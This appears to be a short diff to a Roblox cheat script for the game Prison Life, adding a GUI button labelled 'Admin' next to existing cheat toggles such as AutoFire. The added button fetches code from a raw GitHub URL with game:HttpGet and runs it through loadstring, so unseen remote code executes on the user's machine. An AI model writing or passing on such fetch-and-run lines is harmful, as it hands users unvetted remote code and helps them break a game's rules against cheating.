@@ -122,7 +122,13 @@ if game.PlaceId == 155615604 then
             module["AutoFire"] = true
         end
     end)
+
+    ScriptsSection:NewButton("Admin", "Give u prison life admin", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowDont/admin/main/yes"))()
+    print("clicked")
+    end)
 end
+
 
 local Section = Window:NewTab("Misc")
 local Section = Section:NewSection("Misc")
